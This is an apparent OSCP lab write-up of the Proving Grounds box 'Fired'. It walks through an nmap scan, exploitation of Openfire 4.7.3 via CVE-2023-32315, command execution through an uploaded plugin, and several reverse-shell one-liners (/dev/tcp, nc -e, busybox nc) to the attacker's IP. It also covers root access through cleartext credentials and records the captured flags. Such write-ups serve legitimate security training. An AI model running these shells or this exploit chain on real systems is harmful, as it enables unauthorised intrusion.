---
Date: 2024-10-12
Course: "[[OSCP]]"
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.215.96
Writeup: https://medium.com/@basha5969/fired-proving-grounds-aad10f26d180
---
# Fired
This box was relatively straightforward until the very last step, where I simply couldn't find credentials to move forward. I needed a bit of guidance finding how to setup the admin panel to establish a reverse shell, but all the details were on an exploit page when I went looking. The walkthrough support for the box itself was very limited (or atleast I could only find a single walkthrough for it) and the only major barrier was the very final step - finding a script file in the `openfire` directory that had cleartext root credentials. 

I went through the `openfire` home directory meticulously and couldn't find anything that resembled it (just generic install files), but then found a whole other folder for `openfire` in `/usr/share` as well - `openfire.script` was right there, and while I initially grabbed the wrong password (there was a hash a few lines that looked like a very complex password) as soon as I spotted `OpenFireAtEveryone` it was just a case of logging in with SSH as root to get the flag.

# Resolution summary
- Ran Nmap to identify ports `22`, `9090` & `9091`
- Visited http (`9090`) & identified `Openfire v4.7.3`
- Used exploit to create new user and access admin panel
- Uploaded `openfire-management-tool-plugin.jar` plugin and navigated to command execution
- Established reverse shell with command execution
- Enumerated files in `usr/share/openfire` and found `openfire.script` with cleartext `root` credentials
- Logged in via SSH as `root` 
## Improved skills
- Enumerating local files for credentials
## Used tools
- nmap
- ssh

---
# Information Gathering
Scanned all TCP ports:
```bash
 sudo nmap -sC -sV -oN Fired.nmap 192.168.215.96 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 12 Oct 2024 01:14:14 GMT
|     Last-Modified: Tue, 02 Aug 2022 12:04:43 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 12 Oct 2024 01:14:22 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-28T07:02:39
| Not valid after:  2029-06-27T07:02:39
| MD5:   41ee:f1c1:0cef:c4b0:2436:f5e7:75f4:b064
|_SHA-1: c90c:b82e:0547:56be:1f7b:adb4:4a3a:5de7:c177:a4d3
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 12 Oct 2024 01:14:33 GMT
|     Last-Modified: Tue, 02 Aug 2022 12:04:43 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 12 Oct 2024 01:14:34 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
2 services unrecognized despite returning data.
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 9090 - HTTP
- Navigated to `http://192.168.215.96:9090` and identified `Openfire v4.7.3`
![[Cybersecurity-Resources/images/Pasted image 20241012114639.png]]
- Attempted access with credentials `admin:admin` - unsuccessful
![[Cybersecurity-Resources/images/Pasted image 20241012114928.png]]
## Port 9091 - 
- Navigated to `http://192.168.215.96:9091` 
![[Cybersecurity-Resources/images/Pasted image 20241012115719.png]]

---
# Exploitation
## CVE-2023-32315
- Found `CVE-2023-32315.py` exploit at [https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT], copied to local host and ran `python3 CVE-2023-32315.py -u http://192.168.215.96:9090`
![[Cybersecurity-Resources/images/Pasted image 20241012115241.png]]
- Used newly created credentials `hugme:HugmeNOW` to login to `Openfire` console
![[Cybersecurity-Resources/images/Pasted image 20241012115409.png]]

---
# Lateral Movement to user
## Local Enumeration
- Navigated to `server information` and found details on target host
![[Cybersecurity-Resources/images/Pasted image 20241012120146.png]]
- Navigated to Security Audit Log Viewer and identified `b99aid` has logged into admin console
![[Cybersecurity-Resources/images/Pasted image 20241012120313.png]]
- Conducted further research and found similar exploit with additional instructions at [https://github.com/miko550/CVE-2023-32315]. Downloaded `openfire-management-tool-plugin.jar` and uploaded to Openfire "Plugins" tab
![[Cybersecurity-Resources/images/Pasted image 20241012121734.png]]
- Navigated to "Server > Server Settings > Management Tool > System Command" and tested command execution
![[Cybersecurity-Resources/images/Pasted image 20241012121905.png]]
- Ran `nc -nvlp 4444` to setup netcat listener on local host
- Tested multiple reverse shell commands on target including;
	- `/bin/sh -i >& /dev/tcp/192.168.45.250/4444 0>&1`
	- `nc 192.168.45.250 4444 -e /bin/sh`
	- `nc -c /bin/sh 192.168.45.250 4444`
	- `ncat 192.168.45.250 4444 -e /bin/sh`
	- `busybox nc 192.168.45.250 4444 -e /bin/sh`
- Achieved reverse shell with `busybox nc 192.168.45.250 4444 -e /bin/sh` as user `openfire`
![[Cybersecurity-Resources/images/Pasted image 20241012122500.png]]
- Ran `cat /home/openfire/local.txt` to print `80a99c502edc13ab1a6b38ee03c9b7b9`
![[Cybersecurity-Resources/images/Pasted image 20241012122729.png]]
---
# Privilege Escalation
## Local Enumeration
- Ran `sudo -l` - requires password for `openfire`
![[Cybersecurity-Resources/images/Pasted image 20241012122834.png]]
- Ran `cat /etc/passwd` to find other users
![[Cybersecurity-Resources/images/Pasted image 20241012123225.png]]
- Uploaded `linpeas.sh` to directory `/usr/share/plugins` and ran `./linpeas.sh`
![[Cybersecurity-Resources/images/Pasted image 20241012123812.png]]
 - Identified `sudo` version 1.8.3 - potentially vulnerable to CVE-2021-3156
![[Cybersecurity-Resources/images/Pasted image 20241012101046.png]]
-  Identified vulnerable to CVE-2021-3560
![[Cybersecurity-Resources/images/Pasted image 20241012101134.png]]
- Interesting files in `/etc`
![[Cybersecurity-Resources/images/Pasted image 20241012124238.png]]
## Privilege Escalation vector
- Enumerated files in `/usr/share/openfire`, identified script `/usr/share/openfire/embedded-db/openfire.script` and ran `cat openfire.script`
![[Cybersecurity-Resources/images/Pasted image 20241012132623.png]]
- Identified password hashes as well as cleartext credentials `root:OpenFireAtEveryone`
![[Cybersecurity-Resources/images/Pasted image 20241012132754.png]]
- SSH login with credentials `root:OpenFireAtEveryone`
![[Cybersecurity-Resources/images/Pasted image 20241012133249.png]]
- Ran `cat /root/proof.txt` to print `d02d097957bef575a1e5d0883f9b0e83`
---
# Trophy & Loot
`local.txt` = `80a99c502edc13ab1a6b38ee03c9b7b9`
`root.txt` = `d02d097957bef575a1e5d0883f9b0e83`